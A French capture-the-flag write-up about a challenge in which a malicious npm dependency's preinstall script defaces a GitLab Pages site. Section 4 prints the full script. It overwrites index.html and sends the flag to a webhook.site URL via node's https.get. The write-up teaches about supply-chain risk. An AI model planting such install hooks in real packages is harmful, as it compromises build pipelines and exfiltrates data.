# 🎄 Christmas Countdown — Write‑Up (Advent Calendar CTF)

## 🧩 Introduction

Dans ce challenge, Santa souhaite publier une page web affichant un compte à rebours jusqu’à Noël.  
Il utilise ChatGPT pour générer le code, puis déploie le site via **GitLab Pages**.

Cependant :

- la page fonctionne parfaitement lorsqu’on ouvre directement `index.html` depuis GitLab,
- mais la version publiée via GitLab Pages affiche un **message inquiétant**.

L’objectif est de comprendre **d’où vient ce message** et de retrouver la flag au format : **ADV{}**

---

## 🔍 1. Analyse du dépôt Christmas Countdown
Le dépôt contient :
- un dossier `public/` avec `index.html`,
- un `server.js` pour le développement local,
- un `.gitlab-ci.yml` qui déploie le contenu de `public/`,
- un `package.json` contenant une dépendance suspecte :

```json
"dependencies": {
  "@adv/gift": "1.0.0"
}
```

Cette dépendance attire immédiatement l’attention :
- elle utilise un scope privé @adv,
- elle ne provient pas de npmjs.org,
- elle sera installée automatiquement par GitLab CI lors du déploiement.

---

## 🕵️ 2. Inspection du registre NPM configuré dans GitLab CI

Le `.gitlab-ci.yml` contient :

```json
variables:
  NODE_CONFIG_SCOPED_REGISTRIES: |
    {
      "@adv": {
        "registry": "https://gitlab.com/api/v4/projects/76211108/packages/npm/"
      }
    }
```
        
Cela signifie que :
- toute dépendance @adv/... est récupérée depuis un registre NPM GitLab,
- ce registre appartient au projet Christmas Countdown.

Mais lorsque l’on interroge ce registre :
```text
https://gitlab.com/api/v4/projects/76211108/packages/npm/@adv%2fgift
```

GitLab répond :
```text
"This resource has been moved temporarily to https://registry.npmjs.org/@adv/gift."
```

Or, sur **npmjs.org** :
```bash
npm view @adv/gift
→ 404 Not Found
```

👉 Le package n’existe ni dans le projet, ni sur npmjs.org.
Il doit donc être ailleurs.

## 🎁 3. Découverte du vrai dépôt : advent-calendar-ctf/gift
En explorant le groupe GitLab du CTF, on découvre un dépôt séparé :

👉 https://gitlab.com/advent-calendar-ctf/gift

Ce dépôt contient le vrai code du package @adv/gift.
C’est là que se trouve la clé du challenge.

## 💣 4. Analyse du package malveillant
Le fichier `package.json` du dépôt gift contient :
```json
"scripts": {
  "preinstall": "echo \"You've been p0wned!\" > /builds/$CI_PROJECT_PATH/public/index.html || true; # ADV{MaliciouPayloadExecutedDuringDependencyInstallation}; node -e \"require('https').get('https://webhook.site/f02c5e90-7342-4d5e-abca-1ae30293682e?flag=ADV{MaliciouPayloadExecutedDuringDependencyInstallation}', res => res.pipe(process.stdout))\""
}
```

Ce script preinstall est exécuté automatiquement lorsque GitLab CI installe les dépendances.
Il fait trois choses :
✔️ 1. Il écrase la page HTML du site
```bash
echo "You've been p0wned!" > /builds/$CI_PROJECT_PATH/public/index.html
```
C’est exactement le message affiché sur GitLab Pages.

✔️ 2. Il contient la flag dans un commentaire
```bash
# ADV{MaliciouPayloadExecutedDuringDependencyInstallation}
```

✔️ 3. Il exfiltre la flag vers un webhook externe
```bash
node -e \"require('https').get('https://webhook.site/f02c5e90-7342-4d5e-abca-1ae30293682e?flag=ADV{MaliciouPayloadExecutedDuringDependencyInstallation}'
```
Une démonstration classique d’attaque supply‑chain via npm.


## 🧨 5. Compréhension du problème
Santa a :
- copié-collé un package.json généré par ChatGPT,
- ajouté une dépendance inconnue @adv/gift,
- utilisé un registre NPM GitLab mal configuré,
- déclenché un script preinstall malveillant lors du déploiement.

Résultat :
- GitLab Pages publie un site modifié par le package malveillant,
- la page affichée est remplacée par un message inquiétant,
- la flag est révélée dans le code du package.

## 🏁 6. Flag
La flag se trouve dans le commentaire du script `preinstall` :
```bash
ADV{MaliciouPayloadExecutedDuringDependencyInstallation}
```


## 🎉 Conclusion
Ce challenge illustre parfaitement :
- les risques liés aux dépendances non vérifiées,
- les attaques supply‑chain via scripts npm (preinstall, postinstall, etc.),
- l’importance de comprendre ce que fait réellement un pipeline CI/CD.

Santa a appris une leçon importante :

👉 ne jamais installer aveuglément un package généré par une IA ou provenant d’un registre inconnu.

🧠 Ce que le challenge voulait te faire comprendre
- Santa a ajouté une dépendance @adv/gift générée par ChatGPT.
- Cette dépendance venait d’un registre GitLab… mais en réalité d’un dépôt séparé.
- Le package contenait un script preinstall malveillant.
- GitLab CI installe les dépendances → le script s’exécute → la page est remplacée.
- La flag est dans le payload.

C’est une démonstration parfaite d’une supply-chain attack via npm.


---